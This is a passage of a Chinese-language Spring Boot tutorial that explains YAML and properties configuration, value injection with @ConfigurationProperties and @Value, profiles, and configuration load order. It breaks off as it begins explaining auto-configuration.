href="#2、STS使用-Spring-Starter-Project快速创建项目" class="headerlink" title="2、STS使用 Spring Starter Project快速创建项目"></a>2、STS使用 Spring Starter Project快速创建项目</h3><hr><h1 id="二、配置文件"><a href="#二、配置文件" class="headerlink" title="二、配置文件"></a>二、配置文件</h1><h2 id="1、配置文件"><a href="#1、配置文件" class="headerlink" title="1、配置文件"></a>1、配置文件</h2><p>SpringBoot使用一个全局的配置文件，配置文件名是固定的；</p><p>•application.properties</p><p>•application.yml</p><p>配置文件的作用：修改SpringBoot自动配置的默认值；SpringBoot在底层都给我们自动配置好；</p><p>YAML（YAML Ain’t Markup Language）</p><p>​    YAML  A Markup Language：是一个标记语言</p><p>​    YAML   isn’t Markup Language：不是一个标记语言；</p><p>标记语言：</p><p>​    以前的配置文件；大多都使用的是  <strong>xxxx.xml</strong>文件；</p><p>​    YAML：<strong>以数据为中心</strong>，比json、xml等更适合做配置文件；</p><p>​    YAML：配置例子</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line"><span class="attr">  port:</span> <span class="number">8081</span></span><br></pre></td></tr></table></figure><p>​    XML：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">server</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">port</span>&gt;</span>8081<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2、YAML语法："><a href="#2、YAML语法：" class="headerlink" title="2、YAML语法："></a>2、YAML语法：</h2><h3 id="1、基本语法"><a href="#1、基本语法" class="headerlink" title="1、基本语法"></a>1、基本语法</h3><p>k:(空格)v：表示一对键值对（空格必须有）；</p><p>以<strong>空格</strong>的缩进来控制层级关系；只要是左对齐的一列数据，都是同一个层级的</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line"><span class="attr">    port:</span> <span class="number">8081</span></span><br><span class="line"><span class="attr">    path:</span> <span class="string">/hello</span></span><br></pre></td></tr></table></figure><p>属性和值也是大小写敏感；</p><h3 id="2、值的写法"><a href="#2、值的写法" class="headerlink" title="2、值的写法"></a>2、值的写法</h3><h4 id="字面量：普通的值（数字，字符串，布尔）"><a href="#字面量：普通的值（数字，字符串，布尔）" class="headerlink" title="字面量：普通的值（数字，字符串，布尔）"></a>字面量：普通的值（数字，字符串，布尔）</h4><p>​    k: v：字面直接来写；</p><p>​        字符串默认不用加上单引号或者双引号；</p><p>​        “”：双引号；不会转义字符串里面的特殊字符；特殊字符会作为本身想表示的意思</p><p>​                name:   “zhangsan \n lisi”：输出；zhangsan 换行  lisi</p><p>​        ‘’：单引号；会转义特殊字符，特殊字符最终只是一个普通的字符串数据</p><p>​                name:   ‘zhangsan \n lisi’：输出；zhangsan \n  lisi</p><h4 id="对象、Map（属性和值）（键值对）："><a href="#对象、Map（属性和值）（键值对）：" class="headerlink" title="对象、Map（属性和值）（键值对）："></a>对象、Map（属性和值）（键值对）：</h4><p>​    k: v：在下一行来写对象的属性和值的关系；注意缩进</p><p>​        对象还是k: v的方式</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">friends:</span></span><br><span class="line"><span class="attr">lastName:</span> <span class="string">zhangsan</span></span><br><span class="line"><span class="attr">age:</span> <span class="number">20</span></span><br></pre></td></tr></table></figure><p>行内写法：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">friends:</span> <span class="string">&#123;lastName:</span> <span class="string">zhangsan,age:</span> <span class="number">18</span><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="数组（List、Set）："><a href="#数组（List、Set）：" class="headerlink" title="数组（List、Set）："></a>数组（List、Set）：</h4><p>用- 值表示数组中的一个元素</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">pets:</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">cat</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">dog</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">pig</span></span><br></pre></td></tr></table></figure><p>行内写法</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">pets:</span> <span class="string">[cat,dog,pig]</span></span><br></pre></td></tr></table></figure><h2 id="3、配置文件值注入"><a href="#3、配置文件值注入" class="headerlink" title="3、配置文件值注入"></a>3、配置文件值注入</h2><p>配置文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">person:</span></span><br><span class="line"><span class="attr">    lastName:</span> <span class="string">hello</span></span><br><span class="line"><span class="attr">    age:</span> <span class="number">18</span></span><br><span class="line"><span class="attr">    boss:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">    birth:</span> <span class="number">2017</span><span class="string">/12/12</span></span><br><span class="line"><span class="attr">    maps:</span> <span class="string">&#123;k1:</span> <span class="string">v1,k2:</span> <span class="number">12</span><span class="string">&#125;</span></span><br><span class="line"><span class="attr">    lists:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">lisi</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">zhaoliu</span></span><br><span class="line"><span class="attr">    dog:</span></span><br><span class="line"><span class="attr">      name:</span> <span class="string">小狗</span></span><br><span class="line"><span class="attr">      age:</span> <span class="number">12</span></span><br></pre></td></tr></table></figure><p>javaBean：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将配置文件中配置的每一个属性的值，映射到这个组件中</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ConfigurationProperties</span>：告诉SpringBoot将本类中的所有属性和配置文件中相关的配置进行绑定；</span></span><br><span class="line"><span class="comment"> *      prefix = "person"：配置文件中哪个下面的所有属性进行一一映射</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 只有这个组件是容器中的组件，才能容器提供的<span class="doctag">@ConfigurationProperties</span>功能；</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"person"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> Boolean boss;</span><br><span class="line">    <span class="keyword">private</span> Date birth;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,Object&gt; maps;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Object&gt; lists;</span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br></pre></td></tr></table></figure><p>我们可以导入配置文件处理器，以后编写配置就有提示了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--导入配置文件处理器，配置文件进行绑定就会有提示--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="1、properties配置文件在idea中默认utf-8可能会乱码"><a href="#1、properties配置文件在idea中默认utf-8可能会乱码" class="headerlink" title="1、properties配置文件在idea中默认utf-8可能会乱码"></a>1、properties配置文件在idea中默认utf-8可能会乱码</h4><p>调整</p><p><img src="images/搜狗截图20180130161620.png" alt="idea配置乱码"></p><h4 id="2、-Value获取值和-ConfigurationProperties获取值比较"><a href="#2、-Value获取值和-ConfigurationProperties获取值比较" class="headerlink" title="2、@Value获取值和@ConfigurationProperties获取值比较"></a>2、@Value获取值和@ConfigurationProperties获取值比较</h4><div class="table-container"><table><thead><tr><th></th><th>@ConfigurationProperties</th><th>@Value</th></tr></thead><tbody><tr><td>功能</td><td>批量注入配置文件中的属性</td><td>一个个指定</td></tr><tr><td>松散绑定（松散语法）</td><td>支持</td><td>不支持</td></tr><tr><td>SpEL</td><td>不支持</td><td>支持</td></tr><tr><td>JSR303数据校验</td><td>支持</td><td>不支持</td></tr><tr><td>复杂类型封装</td><td>支持</td><td>不支持</td></tr></tbody></table></div><p>配置文件yml还是properties他们都能获取到值；</p><p>如果说，我们只是在某个业务逻辑中需要获取一下配置文件中的某项值，使用@Value；</p><p>如果说，我们专门编写了一个javaBean来和配置文件进行映射，我们就直接使用@ConfigurationProperties；</p><h4 id="3、配置文件注入值数据校验"><a href="#3、配置文件注入值数据校验" class="headerlink" title="3、配置文件注入值数据校验"></a>3、配置文件注入值数据校验</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"person"</span>)</span><br><span class="line"><span class="meta">@Validated</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * &lt;bean class="Person"&gt;</span></span><br><span class="line"><span class="comment">     *      &lt;property name="lastName" value="字面量/$&#123;key&#125;从环境变量、配置文件中获取值/#&#123;SpEL&#125;"&gt;&lt;/property&gt;</span></span><br><span class="line"><span class="comment">     * &lt;bean/&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//lastName必须是邮箱格式</span></span><br><span class="line">    <span class="meta">@Email</span></span><br><span class="line">    <span class="comment">//@Value("$&#123;person.last-name&#125;")</span></span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="comment">//@Value("#&#123;11*2&#125;")</span></span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="comment">//@Value("true")</span></span><br><span class="line">    <span class="keyword">private</span> Boolean boss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Date birth;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,Object&gt; maps;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Object&gt; lists;</span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br></pre></td></tr></table></figure><h4 id="4、-PropertySource-amp-ImportResource-amp-Bean"><a href="#4、-PropertySource-amp-ImportResource-amp-Bean" class="headerlink" title="4、@PropertySource&amp;@ImportResource&amp;@Bean"></a>4、@PropertySource&amp;@ImportResource&amp;@Bean</h4><p>@<strong>PropertySource</strong>：加载指定的配置文件；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将配置文件中配置的每一个属性的值，映射到这个组件中</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ConfigurationProperties</span>：告诉SpringBoot将本类中的所有属性和配置文件中相关的配置进行绑定；</span></span><br><span class="line"><span class="comment"> *      prefix = "person"：配置文件中哪个下面的所有属性进行一一映射</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 只有这个组件是容器中的组件，才能容器提供的<span class="doctag">@ConfigurationProperties</span>功能；</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@ConfigurationProperties</span>(prefix = "person")默认从全局配置文件中获取值；</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@PropertySource</span>(value = &#123;<span class="string">"classpath:person.properties"</span>&#125;)</span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"person"</span>)</span><br><span class="line"><span class="comment">//@Validated</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * &lt;bean class="Person"&gt;</span></span><br><span class="line"><span class="comment">     *      &lt;property name="lastName" value="字面量/$&#123;key&#125;从环境变量、配置文件中获取值/#&#123;SpEL&#125;"&gt;&lt;/property&gt;</span></span><br><span class="line"><span class="comment">     * &lt;bean/&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//lastName必须是邮箱格式</span></span><br><span class="line">   <span class="comment">// @Email</span></span><br><span class="line">    <span class="comment">//@Value("$&#123;person.last-name&#125;")</span></span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="comment">//@Value("#&#123;11*2&#125;")</span></span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="comment">//@Value("true")</span></span><br><span class="line">    <span class="keyword">private</span> Boolean boss;</span><br></pre></td></tr></table></figure><p>@<strong>ImportResource</strong>：导入Spring的配置文件，让配置文件里面的内容生效；</p><p>Spring Boot里面没有Spring的配置文件，我们自己编写的配置文件，也不能自动识别；</p><p>想让Spring的配置文件生效，加载进来；@<strong>ImportResource</strong>标注在一个配置类上</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ImportResource</span>(locations = &#123;<span class="string">"classpath:beans.xml"</span>&#125;)</span><br><span class="line">导入Spring的配置文件让其生效</span><br></pre></td></tr></table></figure><p>不来编写Spring的配置文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"helloService"</span> <span class="attr">class</span>=<span class="string">"com.atguigu.springboot.service.HelloService"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>SpringBoot推荐给容器中添加组件的方式；推荐使用全注解的方式</p><p>1、配置类<strong>@Configuration</strong>———&gt;Spring配置文件</p><p>2、使用<strong>@Bean</strong>给容器中添加组件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Configuration</span>：指明当前类是一个配置类；就是来替代之前的Spring配置文件</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 在配置文件中用&lt;bean&gt;&lt;bean/&gt;标签添加组件</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAppConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将方法的返回值添加到容器中；容器中这个组件默认的id就是方法名</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> HelloService <span class="title">helloService02</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"配置类@Bean给容器中添加组件了..."</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> HelloService();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、配置文件占位符"><a href="#4、配置文件占位符" class="headerlink" title="4、配置文件占位符"></a>4、配置文件占位符</h2><h3 id="1、随机数"><a href="#1、随机数" class="headerlink" title="1、随机数"></a>1、随机数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;random.value&#125;、$&#123;random.<span class="keyword">int</span>&#125;、$&#123;random.<span class="keyword">long</span>&#125;</span><br><span class="line">$&#123;random.<span class="keyword">int</span>(<span class="number">10</span>)&#125;、$&#123;random.<span class="keyword">int</span>[<span class="number">1024</span>,<span class="number">65536</span>]&#125;</span><br></pre></td></tr></table></figure><h3 id="2、占位符获取之前配置的值，如果没有可以是用-指定默认值"><a href="#2、占位符获取之前配置的值，如果没有可以是用-指定默认值" class="headerlink" title="2、占位符获取之前配置的值，如果没有可以是用:指定默认值"></a>2、占位符获取之前配置的值，如果没有可以是用:指定默认值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">person.last-name=张三$&#123;random.uuid&#125;</span><br><span class="line">person.age=$&#123;random.int&#125;</span><br><span class="line">person.birth=2017/12/15</span><br><span class="line">person.boss=false</span><br><span class="line">person.maps.k1=v1</span><br><span class="line">person.maps.k2=14</span><br><span class="line">person.lists=a,b,c</span><br><span class="line">person.dog.name=$&#123;person.hello:hello&#125;_dog</span><br><span class="line">person.dog.age=15</span><br></pre></td></tr></table></figure><h2 id="5、Profile"><a href="#5、Profile" class="headerlink" title="5、Profile"></a>5、Profile</h2><h3 id="1、多Profile文件"><a href="#1、多Profile文件" class="headerlink" title="1、多Profile文件"></a>1、多Profile文件</h3><p>我们在主配置文件编写的时候，文件名可以是   application-{profile}.properties/yml</p><p>默认使用application.properties的配置；</p><h3 id="2、yml支持多文档块方式"><a href="#2、yml支持多文档块方式" class="headerlink" title="2、yml支持多文档块方式"></a>2、yml支持多文档块方式</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line"><span class="attr">  port:</span> <span class="number">8081</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line"><span class="attr">  profiles:</span></span><br><span class="line"><span class="attr">    active:</span> <span class="string">prod</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line"><span class="attr">  port:</span> <span class="number">8083</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line"><span class="attr">  profiles:</span> <span class="string">dev</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line"><span class="attr">  port:</span> <span class="number">8084</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line"><span class="attr">  profiles:</span> <span class="string">prod</span>  <span class="comment">#指定属于哪个环境</span></span><br></pre></td></tr></table></figure><h3 id="3、激活指定profile"><a href="#3、激活指定profile" class="headerlink" title="3、激活指定profile"></a>3、激活指定profile</h3><p>​    1、在配置文件中指定  spring.profiles.active=dev</p><p>​    2、命令行：</p><p>​        java -jar spring-boot-02-config-0.0.1-SNAPSHOT.jar —spring.profiles.active=dev；</p><p>​        可以直接在测试的时候，配置传入命令行参数</p><p>​    3、虚拟机参数；</p><p>​        -Dspring.profiles.active=dev</p><h2 id="6、配置文件加载位置"><a href="#6、配置文件加载位置" class="headerlink" title="6、配置文件加载位置"></a>6、配置文件加载位置</h2><p>springboot 启动会扫描以下位置的application.properties或者application.yml文件作为Spring boot的默认配置文件</p><p>–file:./config/</p><p>–file:./</p><p>–classpath:/config/</p><p>–classpath:/</p><p>优先级由高到底，高优先级的配置会覆盖低优先级的配置；</p><p>SpringBoot会从这四个位置全部加载主配置文件；<strong>互补配置</strong>；</p><p>==我们还可以通过spring.config.location来改变默认的配置文件位置==</p><p><strong>项目打包好以后，我们可以使用命令行参数的形式，启动项目的时候来指定配置文件的新位置；指定配置文件和默认加载的这些配置文件共同起作用形成互补配置；</strong></p><p>java -jar spring-boot-02-config-02-0.0.1-SNAPSHOT.jar —spring.config.location=G:/application.properties</p><h2 id="7、外部配置加载顺序"><a href="#7、外部配置加载顺序" class="headerlink" title="7、外部配置加载顺序"></a>7、外部配置加载顺序</h2><p><strong>==SpringBoot也可以从以下位置加载配置； 优先级从高到低；高优先级的配置覆盖低优先级的配置，所有的配置会形成互补配置==</strong></p><p><strong>1.命令行参数</strong></p><p>所有的配置都可以在命令行上进行指定</p><p>java -jar spring-boot-02-config-02-0.0.1-SNAPSHOT.jar —server.port=8087  —server.context-path=/abc</p><p>多个配置用空格分开； —配置项=值</p><p>2.来自java:comp/env的JNDI属性</p><p>3.Java系统属性（System.getProperties()）</p><p>4.操作系统环境变量</p><p>5.RandomValuePropertySource配置的random.*属性值</p><p>==<strong>由jar包外向jar包内进行寻找；</strong>==</p><p>==<strong>优先加载带profile</strong>==</p><p><strong>6.jar包外部的application-{profile}.properties或application.yml(带spring.profile)配置文件</strong></p><p><strong>7.jar包内部的application-{profile}.properties或application.yml(带spring.profile)配置文件</strong></p><p>==<strong>再来加载不带profile</strong>==</p><p><strong>8.jar包外部的application.properties或application.yml(不带spring.profile)配置文件</strong></p><p><strong>9.jar包内部的application.properties或application.yml(不带spring.profile)配置文件</strong></p><p>10.@Configuration注解类上的@PropertySource</p><p>11.通过SpringApplication.setDefaultProperties指定的默认属性</p><p>所有支持的配置加载来源；</p><p><a href="https://docs.spring.io/spring-boot/docs/1.5.9.RELEASE/reference/htmlsingle/#boot-features-external-config" target="_blank" rel="noopener">参考官方文档</a></p><h2 id="8、自动配置原理"><a href="#8、自动配置原理" class="headerlink" title="8、自动配置原理"></a>8、自动配置原理</h2><p>配置文件到底能写什么？怎么写？自动配置原理；</p><p><a href="https://docs.spring.io/spring-boot/docs/1.5.9.RELEASE/reference/htmlsingle/#common-application-properties" target="_blank" rel="noopener">配置文件能配置的属性参照</a></p><h3 id="1、自动配置原理："><a href="#1、自动配置原理：" class="headerlink" title="1、自动配置原理："></a>1、<strong>自动配置原理：</strong></h3><p>1）、SpringBoot启动的时候加载主配置类，开启了自动配置功能 ==@EnableAutoConfiguration==</p><p><strong>2）、@EnableAutoConfiguration 作用：</strong></p><ul><li>利用EnableAutoConfigurationImportSelector给容器中导入一些组件？</li></ul><ul><li><p>可以查看selectImports()方法的内容；</p></li><li><p>List<string> configurations = getCandidateConfigurations(annotationMetadata,      attributes);获取候选的配置</string></p><ul><li><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SpringFactoriesLoader.loadFactoryNames()</span><br><span class="line">扫描所有jar包类路径下  META-INF/spring.factories</span><br><span class="line">把扫描到的这些文件的内容包装成properties对象</span><br><span class="line">从properties中获取到EnableAutoConfiguration.class类（类名）对应的值，然后把他们添加在容器中</span><br></pre></td></tr></table></figure><p>​</p></li></ul></li></ul><p><strong>==将 类路径下  META-INF/spring.factories 里面配置的所有EnableAutoConfiguration的值加入到了容器中；==</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"># 